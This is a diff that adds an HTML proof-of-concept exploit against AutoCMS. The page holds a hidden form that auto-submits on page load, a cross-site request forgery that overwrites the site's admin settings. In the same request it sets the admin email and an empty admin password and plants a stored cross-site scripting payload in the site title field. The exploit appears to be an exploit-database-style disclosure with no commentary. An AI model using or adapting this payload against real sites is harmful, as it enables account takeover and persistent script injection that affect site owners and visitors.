@@ -1,0 +1,22 @@
+&lt;form action=&quot;http://www.example.com/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;site_name&quot; value=&quot;AutoCMS by Roberto Aleman&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_url&quot; value=&quot;index.php&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sitetitle&quot; value=&#039;AutoCMS by Roberto Aleman&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin_email&quot; value=&quot;admin@example.com&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;admin_password&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;css_file&quot; value=&quot;black.css&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;index_name_link&quot; value=&quot;Index&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;about_name_link&quot; value=&quot;About&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;about_content&quot; value=&quot;put about text here&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ps_name_link&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ps_content&quot; value=&quot;put producs and services text here&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;news_name_link&quot; value=&quot;News&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;news_content&quot; value=&quot;Title Example1: Text Example1/Title Example2: Text Example2/&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;contact_name_link&quot; value=&quot;Contact&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;update&quot; value=&quot;update&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
